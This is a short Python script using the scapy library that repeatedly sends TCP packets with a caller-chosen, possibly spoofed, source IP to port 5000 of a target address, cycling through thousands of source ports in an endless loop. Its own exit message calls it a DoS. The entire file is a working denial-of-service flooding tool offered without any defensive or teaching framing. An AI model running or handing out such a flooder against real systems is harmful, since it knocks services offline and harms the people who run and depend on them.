#! /usr/bin/env python

import sys
from scapy.all import *

# Establish source and target IPs from input arguments
src_ip = sys.argv[1]
dst_ip = sys.argv[2]
dst_port = 5000

# Set counter
i = 0

try:

    while True:

        # Flood from multiple ports 
        for port in range(5001, 30000):

            i = i + 1 
            # Set addresses and send packets
            _ip = IP(src=src_ip, dst=dst_ip)
            _tcp = TCP(sport=port, dport=dst_port)
            packet = _ip / _tcp
            send(packet, inter = .001)
      
            # Print & Update
            print "Port: " + str(port) + ". Sent packet # " + str(i)

except KeyboardInterrupt:

    print ("\n \n \n \n \n \n \n \n \n \n \n")
    print ("DOS interrupted.")
      